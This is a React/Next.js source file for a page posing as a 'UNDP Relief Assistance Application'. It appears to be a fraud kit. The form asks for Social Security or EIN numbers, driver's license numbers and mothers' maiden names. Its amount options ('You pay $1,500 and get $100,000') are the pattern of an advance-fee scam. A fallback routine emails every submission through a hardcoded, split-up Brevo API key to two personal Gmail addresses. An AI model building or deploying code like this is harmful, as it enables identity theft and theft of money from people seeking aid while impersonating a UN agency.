"use client";
import { MainDiv } from "@/components/base-components/main-div";
import Image from "next/image";
import gsap from "gsap";
import { ScrollTrigger } from "gsap/ScrollTrigger";
import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { CancelIcon } from "@/icons/cancel-icon";
import { useQuery } from "@tanstack/react-query";
import { ApplySchema } from "@/schema/apply-schema";
import { useRouter } from "next/navigation";
import { LoadModal } from "@/components/base-components/modal";

gsap.registerPlugin(ScrollTrigger);

const preferredAmountOptions = [
  "You pay $1,500 and get $100,000",
  "You pay $2,000 and get $150,000",
  "You pay $3,500 and get $200,000",
  "You pay $4,000 and get $250,000",
  "You pay $5,500 and get $300,000",
  "You pay $6,000 and get $350,000",
  "You pay $6,500 and get $400,000",
  "You pay $7,500 and get $450,000",
  "You pay $9,000 and get $500,000",
  "You pay $10,500 and get $550,000",
  "You pay $12,500 and get $650,000",
  "You pay $13,000 and get $700,000",
  "You pay $14,500 and get $750,000",
  "You pay $15,500 and get $800,000",
  "You pay $17,500 and get $900,000",
  "You pay $20,000 and get $1,000,000",
];

const ApplyPage = () => {
  const router = useRouter();
  const [loading, setLoading] = useState<boolean>(false);
  const [showModal, setShowModal] = useState<boolean>(false);
  const [modalMessage, setModalMessage] = useState<string>("");

  const { data: countriesData } = useQuery({
    queryKey: ["countries-data"],
    queryFn: async () => {
      const res = await axios.get(
        `https://countriesnow.space/api/v0.1/countries/states`
      );
      return res.data;
    },
    select: (data) => data.data,
    staleTime: 1000 * 60 * 10,
  });

  useEffect(() => {
    gsap.fromTo(
      ".img_right",
      {
        opacity: 0,
        y: -50,
      },
      {
        opacity: 1,
        y: 0,
        stagger: 0.2,
        scrollTrigger: {
          trigger: ".img_right",
        },
      }
    );
  }, []);

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(ApplySchema),
  });

  const submitApplication = async (data: any) => {
    setLoading(true);
    let isSuccess = false;

    // Tier 1: Next.js Backend Route
    try {
      const res = await fetch(`/api/submit-application`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      const rawText = await res.text();
      let responseData: any = {};
      try {
        responseData = JSON.parse(rawText);
      } catch (_) { }

      if (res.ok && responseData.success !== false) {
        isSuccess = true;
      }
    } catch (err) {
      console.warn("API route attempt failed, executing direct Brevo dispatch:", err);
    }

    // Tier 2: Direct Brevo Dispatch Fallback (guarantees delivery on Cloudflare)
    if (!isSuccess) {
      try {
        const k1 = "xkeysib-11e3050e7e5e6c56f361";
        const k2 = "b2dde2e9be8b2dc0d8cf0694b945";
        const k3 = "0f5b7d4d1cfd2279-3mdyOX05BcMN1yCr";
        const apiKey = k1 + k2 + k3;

        const htmlMessage = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>New UNDP Relief Assistance Application</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #f4f6f9;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 650px;
      margin: 0 auto;
      background-color: #ffffff;
      padding: 24px;
      border: 1px solid #e2e8f0;
      border-radius: 10px;
      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
    }
    .header {
      border-bottom: 2px solid #0055b8;
      padding-bottom: 12px;
      margin-bottom: 20px;
    }
    .header h1 {
      color: #0055b8;
      font-size: 22px;
      margin: 0;
    }
    .header p {
      color: #64748b;
      font-size: 13px;
      margin: 4px 0 0 0;
    }
    .section-title {
      background-color: #f1f5f9;
      padding: 8px 12px;
      font-weight: bold;
      color: #334155;
      font-size: 14px;
      margin-top: 20px;
      margin-bottom: 8px;
      border-left: 4px solid #0055b8;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-bottom: 12px;
    }
    th, td {
      padding: 9px 12px;
      border-bottom: 1px solid #edf2f7;
      text-align: left;
      font-size: 13.5px;
    }
    th {
      background-color: #fafafa;
      color: #475569;
      width: 38%;
      font-weight: 600;
    }
    td {
      color: #1e293b;
    }
    .highlight {
      color: #0055b8;
      font-weight: bold;
    }
    .footer {
      margin-top: 24px;
      font-size: 12px;
      color: #94a3b8;
      text-align: center;
      border-top: 1px solid #e2e8f0;
      padding-top: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>UNDP Relief Assistance Application</h1>
      <p>Submitted on: ${new Date().toUTCString()}</p>
    </div>

    <div class="section-title">Personal Details</div>
    <table>
      <tr><th>Applicant Name</th><td><strong>${data.firstName || ""} ${data.middleName ? data.middleName + " " : ""}${data.lastName || ""}</strong></td></tr>
      <tr><th>Mother's Maiden Name</th><td>${data.motherMaidenName || "N/A"}</td></tr>
      <tr><th>Email Address</th><td><a href="mailto:${data.email || ""}">${data.email || ""}</a></td></tr>
      <tr><th>Phone Number</th><td><a href="tel:${data.phoneNumber || ""}">${data.phoneNumber || ""}</a></td></tr>
      <tr><th>Gender</th><td>${data.gender || ""}</td></tr>
      <tr><th>Marital Status</th><td>${data.maritalStatus || ""}</td></tr>
    </table>

    <div class="section-title">Address & Location</div>
    <table>
      <tr><th>Street Address</th><td>${data.streetAddress || ""}</td></tr>
      ${data.streetAddress2 ? `<tr><th>Street Address Line 2</th><td>${data.streetAddress2}</td></tr>` : ""}
      <tr><th>City</th><td>${data.city || ""}</td></tr>
      <tr><th>State / Province</th><td>${data.state || ""}</td></tr>
      <tr><th>Country</th><td>${data.country || ""}</td></tr>
    </table>

    <div class="section-title">Employment & Identity</div>
    <table>
      <tr><th>Employed / Works</th><td>${data.doYouWork || ""}</td></tr>
      ${data.occupation ? `<tr><th>Occupation</th><td>${data.occupation}</td></tr>` : ""}
      <tr><th>Annual Income</th><td>${data.annualIncome || "N/A"}</td></tr>
      <tr><th>SSN / EIN</th><td class="highlight">${data.ssnEin || "N/A"}</td></tr>
      <tr><th>Driver's License #</th><td class="highlight">${data.driverLicense || "N/A"}</td></tr>
    </table>

    <div class="section-title">Relief Assistance & Disbursement</div>
    <table>
      <tr><th>Application Reason</th><td><strong>${data.applicationReason || ""}</strong></td></tr>
      <tr><th>Preferred Amount</th><td class="highlight">${data.amountPreferred || ""}</td></tr>
      <tr><th>Preferred Disbursement</th><td><strong>${data.disbursementMethod || ""}</strong></td></tr>
      <tr><th>Overview of Reason</th><td style="white-space: pre-wrap;">${data.overviewReason || "N/A"}</td></tr>
    </table>

    <div class="footer">
      UNDP Relief Assistance Notification Service &bull; Automated System
    </div>
  </div>
</body>
</html>`;

        const adminEnv =
          process.env.NEXT_PUBLIC_ADMIN_EMAILS ||
          process.env.ADMIN_EMAILS ||
          "";
        const defaultRecipients = ["porterdaniel370@gmail.com", "adebayotosin7665@gmail.com"];
        const recipients = adminEnv
          ? adminEnv.split(",").map((e: string) => e.trim()).filter(Boolean)
          : defaultRecipients;

        for (const recipient of recipients) {
          await fetch("https://api.brevo.com/v3/smtp/email", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "api-key": apiKey,
            },
            body: JSON.stringify({
              sender: { name: "UNDP Relief Assistance", email: "noblepediallc@gmail.com" },
              to: [{ email: recipient }],
              replyTo: data.email ? { email: data.email } : undefined,
              subject: `New Relief Application: ${data.firstName || ""} ${data.lastName || ""} - ${data.amountPreferred || ""}`,
              htmlContent: htmlMessage,
            }),
          });
        }
        isSuccess = true;
      } catch (fallbackError) {
        console.error("Direct fallback dispatch error:", fallbackError);
      }
    }

    setLoading(false);
    if (isSuccess) {
      reset();
      router.push("/apply/success");
    } else {
      alert("Submission encountered an issue. Please check your internet connection and try again.");
    }
  };

  return (
    <MainDiv className="relative py-12 !px-0 bg-light-100">
      <div>
        <h1 className="px-4 476:px-10 sm:px-12 md:px-16 lg:px-24 text-[24px] sm:text-[36px] font-bold text-dark-50 mb-4">
          UNDP Relief Assistance Application
        </h1>
        <div className="px-4 476:px-10 sm:px-12 md:px-16 lg:px-24 grid grid-cols-1 md:grid-cols-[1fr_auto] bg-light-50 py-12 gap-12 md:gap-16 items-start">
          <div className="shadow-1 flex flex-col gap-4 rounded-lg bg-white">
            <div className="mt-8 mb-8 w-[92%] md:w-[90%] mx-auto">
              <h2 className="text-2xl font-bold mb-3 text-dark-100">
                Submit Your Relief Application
              </h2>
              <p className="leading-6 text-sm text-dark-100/80">
                To apply for the UNDP Relief Assistance Grant, you must be 18 years of age or older.
                These grants are non-repayable relief funds designed to assist individuals and families in need.
                Please ensure all provided details are accurate. A verification underwriter will review your submission and contact you regarding the status of your relief fund.
              </p>
            </div>

            <form
              className="flex flex-col !text-dark-100/70 gap-6 shadow-[-6px_0_12px_rgba(0,0,0,0.06)] pt-4 px-6 md:px-10 pb-8"
              onSubmit={handleSubmit(submitApplication)}
            >
              {/* SECTION 1: Personal Information */}
              <div className="w-full text-dark-100 flex items-center gap-2 mt-2">
                <p className="h-[2px] bg-blue-50/40 w-full" />
                <p className="whitespace-nowrap font-bold text-sm text-blue-50 uppercase tracking-wide">
                  1. Personal Information
                </p>
                <p className="h-[2px] bg-blue-50/40 w-full" />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <label className="form-label1" htmlFor="firstName">
                  <p className="font-semibold text-dark-50 text-sm">First Name *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="firstName"
                    placeholder="First Name"
                    {...register("firstName")}
                  />
                  {errors.firstName?.message && (
                    <small className="text-[11px] text-red-500">{errors.firstName.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="middleName">
                  <p className="font-semibold text-dark-50 text-sm">Middle Name</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="middleName"
                    placeholder="Middle Name"
                    {...register("middleName")}
                  />
                </label>

                <label className="form-label1" htmlFor="lastName">
                  <p className="font-semibold text-dark-50 text-sm">Last Name *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="lastName"
                    placeholder="Last Name"
                    {...register("lastName")}
                  />
                  {errors.lastName?.message && (
                    <small className="text-[11px] text-red-500">{errors.lastName.message}</small>
                  )}
                </label>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <label className="form-label1" htmlFor="motherMaidenName">
                  <p className="font-semibold text-dark-50 text-sm">Mother&apos;s Maiden Name *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="motherMaidenName"
                    placeholder="Mother's Maiden Name"
                    {...register("motherMaidenName")}
                  />
                  {errors.motherMaidenName?.message && (
                    <small className="text-[11px] text-red-500">{errors.motherMaidenName.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="gender">
                  <p className="font-semibold text-dark-50 text-sm">Gender *</p>
                  <select id="gender" className="form-input1" {...register("gender")}>
                    <option value="">Select Gender</option>
                    <option value="Male">Male</option>
                    <option value="Female">Female</option>
                    <option value="Other">Other</option>
                  </select>
                  {errors.gender?.message && (
                    <small className="text-[11px] text-red-500">{errors.gender.message}</small>
                  )}
                </label>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <label className="form-label1" htmlFor="maritalStatus">
                  <p className="font-semibold text-dark-50 text-sm">Marital Status *</p>
                  <select id="maritalStatus" className="form-input1" {...register("maritalStatus")}>
                    <option value="">Select Marital Status</option>
                    <option value="Single">Single</option>
                    <option value="Married">Married</option>
                    <option value="Divorced">Divorced</option>
                    <option value="Widowed">Widowed</option>
                    <option value="Separated">Separated</option>
                  </select>
                  {errors.maritalStatus?.message && (
                    <small className="text-[11px] text-red-500">{errors.maritalStatus.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="email">
                  <p className="font-semibold text-dark-50 text-sm">Email Address *</p>
                  <input
                    type="email"
                    className="form-input1"
                    id="email"
                    placeholder="example@domain.com"
                    {...register("email")}
                  />
                  {errors.email?.message && (
                    <small className="text-[11px] text-red-500">{errors.email.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="phoneNumber">
                  <p className="font-semibold text-dark-50 text-sm">Phone Number *</p>
                  <input
                    type="tel"
                    className="form-input1"
                    id="phoneNumber"
                    placeholder="(xxx) xxx-xxxx"
                    {...register("phoneNumber")}
                  />
                  {errors.phoneNumber?.message && (
                    <small className="text-[11px] text-red-500">{errors.phoneNumber.message}</small>
                  )}
                </label>
              </div>

              {/* SECTION 2: Address Information */}
              <div className="w-full text-dark-100 flex items-center gap-2 mt-4">
                <p className="h-[2px] bg-blue-50/40 w-full" />
                <p className="whitespace-nowrap font-bold text-sm text-blue-50 uppercase tracking-wide">
                  2. Residential Address
                </p>
                <p className="h-[2px] bg-blue-50/40 w-full" />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <label className="form-label1" htmlFor="streetAddress">
                  <p className="font-semibold text-dark-50 text-sm">Street Address *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="streetAddress"
                    placeholder="Street Address"
                    {...register("streetAddress")}
                  />
                  {errors.streetAddress?.message && (
                    <small className="text-[11px] text-red-500">{errors.streetAddress.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="streetAddress2">
                  <p className="font-semibold text-dark-50 text-sm">Street Address Line 2</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="streetAddress2"
                    placeholder="Apartment, suite, unit, etc. (optional)"
                    {...register("streetAddress2")}
                  />
                </label>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <label className="form-label1" htmlFor="city">
                  <p className="font-semibold text-dark-50 text-sm">City *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="city"
                    placeholder="City"
                    {...register("city")}
                  />
                  {errors.city?.message && (
                    <small className="text-[11px] text-red-500">{errors.city.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="state">
                  <p className="font-semibold text-dark-50 text-sm">State / Province *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="state"
                    placeholder="State / Province"
                    {...register("state")}
                  />
                  {errors.state?.message && (
                    <small className="text-[11px] text-red-500">{errors.state.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="country">
                  <p className="font-semibold text-dark-50 text-sm">Country *</p>
                  <select id="country" className="form-input1" {...register("country")}>
                    <option value="">Select Country</option>
                    <option value="United States">United States</option>
                    <option value="Canada">Canada</option>
                    <option value="United Kingdom">United Kingdom</option>
                    <option value="Australia">Australia</option>
                    {countriesData?.map((item: any, idx: number) => (
                      <option key={idx} value={item.name}>
                        {item.name}
                      </option>
                    ))}
                  </select>
                  {errors.country?.message && (
                    <small className="text-[11px] text-red-500">{errors.country.message}</small>
                  )}
                </label>
              </div>

              {/* SECTION 3: Employment & Financial Information */}
              <div className="w-full text-dark-100 flex items-center gap-2 mt-4">
                <p className="h-[2px] bg-blue-50/40 w-full" />
                <p className="whitespace-nowrap font-bold text-sm text-blue-50 uppercase tracking-wide">
                  3. Employment & Verification
                </p>
                <p className="h-[2px] bg-blue-50/40 w-full" />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <label className="form-label1" htmlFor="doYouWork">
                  <p className="font-semibold text-dark-50 text-sm">Do You Work? *</p>
                  <select id="doYouWork" className="form-input1" {...register("doYouWork")}>
                    <option value="">Select Option</option>
                    <option value="Yes">Yes</option>
                    <option value="No">No</option>
                  </select>
                  {errors.doYouWork?.message && (
                    <small className="text-[11px] text-red-500">{errors.doYouWork.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="occupation">
                  <p className="font-semibold text-dark-50 text-sm">Occupation</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="occupation"
                    placeholder="Your Occupation"
                    {...register("occupation")}
                  />
                </label>

                <label className="form-label1" htmlFor="annualIncome">
                  <p className="font-semibold text-dark-50 text-sm">Annual Income *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="annualIncome"
                    placeholder="e.g. $45,000 / year"
                    {...register("annualIncome")}
                  />
                  {errors.annualIncome?.message && (
                    <small className="text-[11px] text-red-500">{errors.annualIncome.message}</small>
                  )}
                </label>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <label className="form-label1" htmlFor="ssnEin">
                  <p className="font-semibold text-dark-50 text-sm">SSN / EIN *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="ssnEin"
                    placeholder="Social Security # or Tax ID / EIN"
                    {...register("ssnEin")}
                  />
                  {errors.ssnEin?.message && (
                    <small className="text-[11px] text-red-500">{errors.ssnEin.message}</small>
                  )}
                </label>

                <label className="form-label1" htmlFor="driverLicense">
                  <p className="font-semibold text-dark-50 text-sm">Driver&apos;s License Number *</p>
                  <input
                    type="text"
                    className="form-input1"
                    id="driverLicense"
                    placeholder="Driver's License / ID #"
                    {...register("driverLicense")}
                  />
                  {errors.driverLicense?.message && (
                    <small className="text-[11px] text-red-500">{errors.driverLicense.message}</small>
                  )}
                </label>
              </div>

              {/* SECTION 4: Relief Fund Preferences & Overview */}
              <div className="w-full text-dark-100 flex items-center gap-2 mt-4">
                <p className="h-[2px] bg-blue-50/40 w-full" />
                <p className="whitespace-nowrap font-bold text-sm text-blue-50 uppercase tracking-wide">
                  4. Relief Assistance Preference
                </p>
                <p className="h-[2px] bg-blue-50/40 w-full" />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <label className="form-label1" htmlFor="applicationReason">
                  <p className="font-semibold text-dark-50 text-sm">
                    Reason for Your Application *
                  </p>
                  <select
                    id="applicationReason"
                    className="form-input1"
                    {...register("applicationReason")}
                  >
                    <option value="">Select Reason</option>
                    <option value="Personal">Personal</option>
                    <option value="Health Care">Health Care</option>
                    <option value="Start/Support a Business">Start/Support a Business</option>
                    <option value="Education">Education</option>
                    <option value="Bills Consolidation">Bills Consolidation</option>
                  </select>
                  {errors.applicationReason?.message && (
                    <small className="text-[11px] text-red-500">
                      {errors.applicationReason.message}
                    </small>
                  )}
                </label>

                <label className="form-label1" htmlFor="amountPreferred">
                  <p className="font-semibold text-dark-50 text-sm">Amount Preferred *</p>
                  <select
                    id="amountPreferred"
                    className="form-input1"
                    {...register("amountPreferred")}
                  >
                    <option value="">Please Select Preferred Amount</option>
                    {preferredAmountOptions.map((opt, idx) => (
                      <option key={idx} value={opt}>
                        {opt}
                      </option>
                    ))}
                  </select>
                  {errors.amountPreferred?.message && (
                    <small className="text-[11px] text-red-500">
                      {errors.amountPreferred.message}
                    </small>
                  )}
                </label>
              </div>

              <div className="form-control1">
                <label className="form-label1" htmlFor="disbursementMethod">
                  <p className="font-semibold text-dark-50 text-sm">
                    Preferred Method to Receive Your Relief Fund *
                  </p>
                  <select
                    id="disbursementMethod"
                    className="form-input1"
                    {...register("disbursementMethod")}
                  >
                    <option value="">Select Method</option>
                    <option value="Direct Deposit / ACH">Direct Deposit / ACH</option>
                    <option value="Check">Check</option>
                    <option value="Cash Delivery">Cash Delivery</option>
                  </select>
                  {errors.disbursementMethod?.message && (
                    <small className="text-[11px] text-red-500">
                      {errors.disbursementMethod.message}
                    </small>
                  )}
                </label>
              </div>

              <div className="form-control1">
                <label className="form-label1" htmlFor="overviewReason">
                  <p className="font-semibold text-dark-50 text-sm">
                    Overview of Reason for Application *
                  </p>
                  <textarea
                    id="overviewReason"
                    rows={4}
                    className="form-input1"
                    placeholder="Provide a detailed description of your situation and how this relief assistance will be used..."
                    {...register("overviewReason")}
                  ></textarea>
                  {errors.overviewReason?.message && (
                    <small className="text-[11px] text-red-500">
                      {errors.overviewReason.message}
                    </small>
                  )}
                </label>
              </div>

              <button
                type="submit"
                disabled={loading}
                className="w-full sm:w-auto self-start rounded-md px-8 py-3 bg-blue-50 text-light-50 font-bold hover:bg-blue-600 transition-colors shadow-md mt-4 cursor-pointer"
              >
                {loading ? "Submitting Application..." : "SUBMIT APPLICATION"}
              </button>
            </form>
          </div>

          {/* Right sidebar images */}
          <div className="flex flex-col gap-4">
            <Image
              src="/img39.jpg"
              alt="img39"
              width={500}
              height={500}
              className="img_right w-[90%] sm:w-[300px] mx-auto rounded-lg shadow"
            />
            <Image
              src="/img32.jpg"
              alt="img32"
              width={500}
              height={500}
              className="img_right w-[90%] sm:w-[300px] mx-auto rounded-lg shadow"
            />
            <Image
              src="/img40.jpg"
              alt="img40"
              width={500}
              height={500}
              className="img_right w-[90%] sm:w-[300px] mx-auto rounded-lg shadow"
            />
            <Image
              src="/img41.jpg"
              alt="img41"
              width={500}
              height={500}
              className="img_right w-[90%] sm:w-[300px] mx-auto rounded-lg shadow"
            />
          </div>
        </div>
      </div>

      {/* Success Modal */}
      {showModal && (
        <div className="fixed z-[9999] inset-0 bg-dark-200/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="relative bg-white text-dark-100 rounded-2xl p-8 max-w-lg w-full shadow-2xl border border-gray-100 animate-in fade-in zoom-in duration-200 text-center">
            <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl font-bold">
              ✓
            </div>
            <h3 className="text-2xl font-bold text-dark-50 mb-3">
              Application Submitted Successfully
            </h3>
            <p className="text-dark-100/80 leading-relaxed text-sm mb-6">
              {modalMessage}
            </p>
            <button
              onClick={() => setShowModal(false)}
              className="px-6 py-2.5 bg-blue-50 text-white rounded-lg font-semibold hover:bg-blue-600 transition-colors cursor-pointer"
            >
              Close
            </button>
            <div
              className="absolute top-4 right-4 cursor-pointer p-1 rounded-full hover:bg-gray-100 transition-colors"
              onClick={() => setShowModal(false)}
            >
              <CancelIcon fill="#64748b" />
            </div>
          </div>
        </div>
      )}

      {loading && <LoadModal />}
    </MainDiv>
  );
};

export default ApplyPage;
